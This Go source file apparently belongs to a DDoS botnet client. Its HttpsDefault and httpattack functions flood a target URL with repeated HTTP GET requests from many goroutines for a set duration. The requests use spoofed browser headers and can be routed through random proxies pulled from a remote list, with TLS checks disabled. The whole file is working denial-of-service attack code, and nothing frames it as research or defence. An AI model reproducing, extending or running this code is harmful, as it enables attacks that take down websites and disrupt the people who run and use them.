package methods

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"homo/client/balancer"
	"homo/client/config"
	"homo/client/utils"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func HttpsDefault(target string, port string, duration string, useproxy string) {

	defer func() { // try catch
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {

		for i := 0; i <= 4; i++ {
			go httpattack(target, useproxy)
		}
		time.Sleep(100 * time.Millisecond)

	}
}

func httpattack(target, useproxy string) {
	defer func() { // try catch
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	client, req := newreq(target, useproxy)
	for i := 0; i < 30; i++ {
		select {
		case <-balancer.BalanceCh:
			fmt.Println("Balancer")
			time.Sleep(5 * time.Second)
		default:
			fmt.Println(i)
			fmt.Println(target)
			client.Do(req)
			_, err := client.Do(req)

			if err != nil {
				fmt.Println(err)
			}
			time.Sleep(10 * time.Millisecond)
		}
	}
}

func newreq(target string, useproxy string) (*http.Client, *http.Request) {

	defer func() { // try catch
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	var client *http.Client

	req, _ := http.NewRequest("GET", target, nil)
	if useproxy == "true" {

		proxy := getProxy()

		var proxyURL url.URL

		if len(proxy) > 2 { // proxy with auth
			proxyURL = url.URL{
				Scheme: "http",
				Host:   proxy[2] + ":" + proxy[3]}

			auth := fmt.Sprintf("%s:%s", proxy[0], proxy[1])
			basic := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basic)
		} else {
			proxyURL = url.URL{
				Scheme: "http",
				Host:   proxy[0] + ":" + proxy[1]}
		}

		transport := &http.Transport{
			Proxy:           http.ProxyURL(&proxyURL),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		transport.ProxyConnectHeader = req.Header

		client = &http.Client{Transport: transport}

	} else {
		req.Header.Add("User-Agent", utils.GetUserAgent())
		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		req.Header.Add("Accept-Encoding", "gzip, deflate, br")
		req.Header.Add("Accept-Language", "en-US,en;q=0.5")
		req.Header.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
		client = &http.Client{}
	}
	return client, req
}

func getProxy() []string {

_GETPROXY:
	_proxies, err := http.Get(config.PROXYURL)

	if err != nil {
		fmt.Println(err)
		goto _GETPROXY
	}

	proxies, err := io.ReadAll(_proxies.Body)

	if err != nil {
		fmt.Println(err)
		goto _GETPROXY
	}

	var strs []string

	for _, i := range strings.Split(string(proxies), "\n") {

		if len(i) < 2 {
			continue
		}

		strs = append(strs, i)
	}

	cStrs := len(strs)

	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)

	d := strs[r1.Intn(cStrs)]

	proxy := strings.Split(d, ":")

	return proxy

}
